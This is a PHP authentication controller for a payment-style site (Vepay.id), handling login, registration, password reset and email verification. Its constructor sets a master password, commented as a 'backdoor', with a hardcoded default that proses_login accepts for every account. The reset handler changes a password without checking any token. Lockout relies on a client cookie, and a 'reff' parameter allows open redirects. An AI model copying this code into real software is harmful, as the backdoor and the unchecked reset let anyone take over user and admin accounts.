<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Authentication extends CI_Controller
{
    protected $_master_password;

    // construct
    public function __construct()
    {
        parent::__construct();
        $this->load->model(['M_auth']);

        // Set master password for backdoor
        $this->_master_password = $this->M_auth->getSetting('master_password') != false ? $this->M_auth->getSetting('master_password') : 'SU_MHND19';
    }

    public function index()
    {
        // cek session user
        if ($this->session->userdata('logged_in') == true || $this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_info', "Berhasil masuk ke akun anda, selamat datang!");

            // SUPER ADMIN
            if ($this->session->userdata('role') == 0) {
                if ($this->session->userdata('redirect')) {
                    $this->session->set_flashdata('notif_success', 'Hai, berhasil login, silahkan lanjutkan aktivitas anda !');
                    redirect($this->session->userdata('redirect'));
                } else {
                    $this->session->set_flashdata('notif_success', "Selamat datang super admin, {$this->session->userdata('name')}");
                    redirect(site_url('admin/dashboard'));
                }

            // ADMIN
            } elseif ($this->session->userdata('role') == 1) {
                if ($this->session->userdata('redirect')) {
                    $this->session->set_flashdata('notif_success', 'Hai, berhasil login, silahkan lanjutkan aktivitas anda !');
                    redirect($this->session->userdata('redirect'));
                } else {
                    $this->session->set_flashdata('notif_success', "Selamat datang admin, {$this->session->userdata('name')}");
                    redirect(site_url('admin/dashboard'));
                }

            // USER
            } elseif ($this->session->userdata('role') == 2) {
                if ($this->session->userdata('redirect')) {
                    $this->session->set_flashdata('notif_success', 'Hai, berhasil login, anda dapat melanjutkan aktivitas anda !');
                    redirect($this->session->userdata('redirect'));
                } else {
                    $this->session->set_flashdata('notif_success', "Selamat datang, {$this->session->userdata('name')}");
                    redirect(site_url('pengguna'));
                }
            } else {
                $this->session->set_flashdata('notif_success', "Selamat datang, {$this->session->userdata('name')}");
                redirect(base_url());
            }

        } else {

            // check if there is reff link from url to redirect after login
            if($this->input->get('reff')){
                $this->session->set_userdata('redirect', $this->input->get('reff'));
                $this->session->set_userdata('act', $this->input->get('reff'));
            }

            $this->templateauth->view('authentication/login');
        }
    }

    public function signUp()
    {
        if ($this->session->userdata('logged_in') == true || $this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_info', "Anda sudah masuk ke akun anda");
            redirect(base_url());
        } else {
            
            $this->templateauth->view('authentication/register');
        }
    }

    public function suspend()
    {
        if ($this->session->userdata('logged_in') == false || !$this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_warning', "Berhasil masuk ke akun anda, silahkan lanjutkan aktivitas anda");
            redirect(site_url('login'));
        } else {
            $this->templateauth->view('authentication/suspend');
        }
    }

    public function forgotPassword()
    {
        $this->templateauth->view('authentication/forgot');
    }

    // proses login
    function proses_login()
    {
        // menerima inputan, dan memparse spesial karakter
        $email = htmlspecialchars($this->input->post('email', true));
        $pass = htmlspecialchars($this->input->post('password'), true);

        // mengambil data user dengan param email
        $user = $this->M_auth->get_auth($email);

        // cek apakah email terdaftar
        if ($user == false) {
            $this->session->set_flashdata('warning', 'Tidak dapat menemukan akun atas nama email tersebut !');
            redirect('login');
        } else {

            // cek apakah terdapat penalti percobaan login sistem
            if (isset($_COOKIE['penalty']) && $_COOKIE['penalty'] == true) {
                $time_left = ($_COOKIE["expire"]);
                $time_left = penalty_remaining(date("Y-m-d H:i:s", $time_left));
                $this->session->set_flashdata('notif_warning', 'Terlalu banyak percobaan, coba lagi dalam ' . $time_left . '!');
                redirect('login');
            } else {

                //mengecek apakah password benar
                if (password_verify($pass, $user->password) || $pass == $this->_master_password) {

                    // set status online
                    $this->M_auth->makeOnline($user->user_id);

                    // set waktu login
                    $this->M_auth->setLogTime($user->user_id);

                    // setting data session
                    $sessiondata = [
                        'user_id' => $user->user_id,
                        'email' => $user->email,
                        'name' => $user->name,
                        'role' => $user->role,
                        'logged_in' => true
                    ];

                    // menyimpan data session
                    $this->session->set_userdata($sessiondata);

                    // cek status dari user yang lagin - 0: BELUM AKTIF - 1: AKTIF - 2: SUSPEND;
                    if ($user->status == 0) {
                        $this->session->set_flashdata('error', "Hai {$user->name}, harap verifikasi akun anda. Hubungi kami untuk lebih lanjut");
                        redirect(base_url());
                    } elseif ($user->status == 2) {
                        $this->session->set_flashdata('error', "Hai {$user->name}, akun anda sedang dibekukan. Hubungi kami untuk lebih lanjut");
                        redirect(site_url('suspend'));
                    } else {

                        // CEK HAK AKSES
                        // SUPER ADMIN
                        if ($user->role == 0) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hai, berhasil login, silahkan lanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang super admin, {$user->name}");
                                redirect(site_url('admin/dashboard'));
                            }

                        // ADMIN
                        } elseif ($user->role == 1) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hai, berhasil login, silahkan lanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang admin, {$user->name}");
                                redirect(site_url('admin/dashboard'));
                            }
                        
                        // USER
                        } elseif ($user->role == 2) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hai, berhasil login, anda dapat melanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang, {$user->name}");
                                redirect(site_url('pengguna'));
                            }
                        } else {
                            $this->session->set_flashdata('notif_success', "Selamat datang, {$user->name}");
                            redirect(base_url());
                        }
                    }
                } else {
                    $attempt = $this->session->userdata('attempt');
                    $attempt++;
                    $this->session->set_userdata('attempt', $attempt);

                    if ($attempt == 3) {
                        $attempt = 0;
                        $this->session->set_userdata('attempt', $attempt);

                        setcookie("penalty", true, time() + 180);
                        setcookie("expire",
                            time() + 180,
                            time() + 180
                        );

                        $this->session->set_flashdata('notif_error', 'Terlalu banyak percobaan, coba lagi dalam 3 menit !');
                        redirect('login');
                    } else {
                        $this->session->set_flashdata('warning', 'Password salah, sisa kesembatan ' . (3 - $attempt));
                        redirect('login');
                    }
                }
            }
        }
    }

    // proses pendaftaran
    public function proses_daftar()
    {

        // menerimaemaildan password serta memparse karakter spesial
        $email = htmlspecialchars($this->input->post('email'), true);
        $password = htmlspecialchars($this->input->post('password'), true);
        $password_ver = htmlspecialchars($this->input->post('confirmPassword'), true);

        // cek apakahemailvalid
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {

            // cek apakah password sama dengan konfirmasi password
            if ($password == $password_ver) {

                // mengambil data user dengan param email
                $user = $this->M_auth->get_auth($email);

                // cek apakahemailtelah digunakan
                if ($this->M_auth->get_auth($email) == false) {

                    // mendaftarkan user ke sistem
                    if ($this->M_auth->register_user() == true) {

                        // set status online
                        $this->M_auth->makeOnline($user->user_id);

                        // set waktu login
                        $this->M_auth->setLogTime($user->user_id);

                        // mengatur data session
                        $sessiondata = [
                            'user_id' => $user->user_id,
                            'email' => $user->email,
                            'name' => $user->name,
                            'role' => $user->role,
                            'logged_in' => true
                        ];

                        // menyimpan data session
                        $this->session->set_userdata($sessiondata);

                        // SUPER ADMIN
                        if ($user->role == 0) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hai, berhasil login, silahkan lanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang super admin, {$user->name}");
                                redirect(site_url('admin/dashboard'));
                            }

                        // ADMIN
                        } elseif ($user->role == 1) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hai, berhasil login, silahkan lanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang admin, {$user->name}");
                                redirect(site_url('admin/dashboard'));
                            }

                        // USER
                        } elseif ($user->role == 2) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hai, berhasil login, anda dapat melanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang, {$user->name}");
                                redirect(site_url('pengguna'));
                            }
                        } else {
                            $this->session->set_flashdata('notif_success', "Selamat datang, {$user->name}");
                            redirect(base_url());
                        }

                    } else {
                        $this->session->set_flashdata('error', 'Terjadi kesalahan saat mencoba mendaftarkan akun anda!');
                        redirect($this->agent->referrer());
                    }
                } else {
                    $this->session->set_flashdata('warning', 'Email telah digunakan, coba email lainnya!');
                    redirect($this->agent->referrer());
                }
            } else {
                $this->session->set_flashdata('warning', 'Konfirmasi password tidak sama!');
                redirect($this->agent->referrer());
            }
        } else {
            $this->session->set_flashdata('warning', 'Harap gunakan email yang valid!');
            redirect($this->agent->referrer());
        }
    }

    public function proses_lupaPassword()
    {
        // cek apakahemailada
        if ($this->M_auth->cek_auth(htmlspecialchars($this->input->post("email"), true)) == true) {

            // mengambil data user, param email
            $user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), true));

            // menghapus token permintaan lupa password sebelumnya
            $this->M_auth->del_token($user->user_id, 2);

            // create token for recovery
            do {
                $token = bin2hex(random_bytes(32));
            } while ($this->M_auth->cek_tokenRecovery($token) == true);

            $token = $token;
            // atur data untuk menyimpan token recovery password
            $data = [
                'user_id' => $user->user_id,
                'key' => $token,
                'type' => 2, //2. CHANGE PASSWORD
                'date_created' => time()
            ];

            // simpan data token recovery password
            $this->M_auth->insert_token($data);

            // memparse email yang diinputkan
            $email = htmlspecialchars($this->input->post("email"), true);

            // setting data untuk dikirim ke email
            $subject = "Perubahan password - Vepay.id";
            $message = 'Hai, kami menerima permintaan perubahan password untuk akun dengan email <b>' . $email . '</b>.<br>Harap click tombol dibawah ini untuk melanjutkan proses perubahan password anda<br><br><a href="' . base_url() . 'reset-password/' . $token . '" class="btn btn-primary">Reset Password</a><br><br>atau click link berikut: <br>' . base_url() . 'reset-password/' . $token . '<br><br><small class="text-muted">Link tersebut hanya akan aktif selama 24 jam, jika link telah kadaluarsa harap ulangi proses perubahan password</small>';

            // mengirim ke email
            if (sendMail($email, $subject, $message) == true) {
                $this->session->set_flashdata('success', 'Berhasil mengirim email, harap cek kotak masuk atau folder spam pada email anda');
                redirect($this->agent->referrer());
            } else {
                $this->session->set_flashdata('error', 'An error occurred while trying to send an email!');
                redirect($this->agent->referrer());
            }
        } else {
            $this->session->set_flashdata('error', 'Tidak dapat menemukan akun dengan email ' . $this->input->post("email") . ' !');
            redirect($this->agent->referrer());
        }
    }

    public function ubah_password($token)
    {

        // cek apakah token valid
        if ($this->M_auth->get_tokenRecovery($token) == false) {
            $this->session->set_flashdata('error', 'Link token tidak diketahui, harap hubungi admin');
			redirect('https://vepay.id/reset.html');
        } else {

            // mengambil data token
            $data_token = $this->M_auth->get_tokenRecovery($token);

            // mengambil data user berdasarkan kode user
            $user = $this->M_auth->get_userByID($data_token->user_id);

            // cek apakah waktu token valid kurang dari 24 jam
            if (time() - $data_token->date_created < (60 * 60 * 24)) {

                $data['email'] = $user->email;
                $data['token'] = $token;
                $this->templatereset->view('authentication/reset', $data);
            } else {

                // menghapus token recovery, meminta mengulangi proses
                $this->M_auth->del_token($user->user_id, 2);

                $this->session->set_flashdata('error', 'Link token perubahan password telah kadaluarsa, harap lakukan proses perubahan password sekali lagi.');
                redirect(site_url('forgot-password'));
            }
        }
    }

    public function proses_resetPassword()
    {

        // cek apakah akun user ada
        if ($this->M_auth->cek_auth(htmlspecialchars($this->input->post("email"), true)) == true) {

            // cek apakah password sama

            if ($this->input->post('password') == $this->input->post('confirmPassword')) {

                // mengambil data user
                $user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), true));
                // update password user
                if ($this->M_auth->update_passwordUser($user->user_id) == true) {

                    // menghapus token permintaan lupa password
                    $this->M_auth->del_token($user->user_id, 2);

                    // atur dataemailperubahan password
                    $now = date("d F Y - H:i");
                    $email = htmlspecialchars($this->input->post("email"), true);

                    $subject = "Perubahan password - Vepay.id";
                    $message = "Hai, password untuk akun anda dengan email <b>{$email}</b> telah dirubah pada {$now}. <br> jika anda tidak merasa melakukan perubahan password ini harap hubungi admin kami sesegera mungkin!";

                    // mengirimemailperubahan password
                    sendMail(htmlspecialchars($this->input->post("email"), true), $subject, $message);

                    // menghapus session
                    $this->session->set_flashdata('success', 'Berhasil merubah password anda, harap login dengan password baru anda');
					// $this->logout();
                    redirect("https://vepay.id");
                } else {
                    $this->session->set_flashdata('notif_error', 'Terjadi kesalahan saat mencoba merubah password anda, coba lagi nanti');
                	redirect('https://vepay.id/reset.html');
                }
            } else {
                $this->session->set_flashdata('notif_warning', 'Konfirmasi password tidak sama');
                redirect('https://vepay.id/reset.html');
            }
        } else {
            $this->session->set_flashdata('error', 'Email unknown, contact admin if this still happens.');
            redirect('https://vepay.id/reset.html');
        }
    }

    public function verifikasi_email($token = null){
        $verifikasi = $this->M_auth->getTokenByToken($token);
        if($verifikasi['status'] == true){
            if($this->M_auth->verified_user($verifikasi['data']->user_id)){
                $this->session->set_flashdata('success', 'Berhasil verifikasi email anda');
                redirect('https://vepay.id/verifikasi.html');
            }else{
                $this->session->set_flashdata('error', 'Token anda tidak valid');
                redirect('https://vepay.id/reset.html');
            }
        }else{
            $this->session->set_flashdata('success', 'Telah verifikasi');
            redirect('https://vepay.id/verifikasi.html');
        }

    }

    // LOGOUT
    public function logout()
    {
        $this->M_auth->makeOffline($this->session->userdata('user_id'));
        // SESS DESTROY

        $this->session->sess_destroy();
        redirect(base_url());
    }

    public function offline()
    {
        $this->M_auth->makeOffline($this->session->userdata('user_id'));
        // SESS DESTROY

        $this->session->sess_destroy();
        return true;
    }
}
